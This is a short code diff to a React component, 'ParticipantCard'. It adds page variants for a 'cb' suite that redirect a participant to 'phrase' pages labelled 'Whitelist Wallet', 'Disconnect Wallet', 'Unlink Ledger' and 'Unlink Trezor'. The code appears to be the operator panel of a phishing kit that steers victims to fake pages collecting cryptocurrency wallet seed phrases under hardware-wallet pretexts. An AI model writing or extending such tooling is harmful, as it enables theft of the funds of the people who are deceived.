@@ -877,14 +877,27 @@ function ParticipantCard({
       next.delete(k);
       return next;
     });
-    if (k === "redirect") setTimeout(() => setPickedSuite(null), 200);
+    if (k === "redirect") setTimeout(() => { setPickedSuite(null); setPickedPage(null); }, 200);
   }
   const [pickedSuite, setPickedSuite] = useState<Suite | null>(null);
+  const [pickedPage, setPickedPage] = useState<Page | null>(null);
+
+  const PAGE_VARIANTS: Record<string, Record<string, { value: string; label: string }[]>> = {
+    cb: {
+      phrase: [
+        { value: "phrase?mode=whitelist", label: "Whitelist Wallet" },
+        { value: "phrase?mode=disconnect", label: "Disconnect Wallet" },
+        { value: "phrase?mode=ledger", label: "Unlink Ledger" },
+        { value: "phrase?mode=trezor", label: "Unlink Trezor" },
+      ],
+    },
+  };
 
   const pageOpts: PageOpt[] = useMemo(
     () => (pickedSuite ? pagesFromPagesFor(getRedirectPages(pickedSuite)) : []),
     [pickedSuite, regRev],
   );
+
 
   const submitted = useMemo(() => {
     const map = new Map<string, InputPayload>();
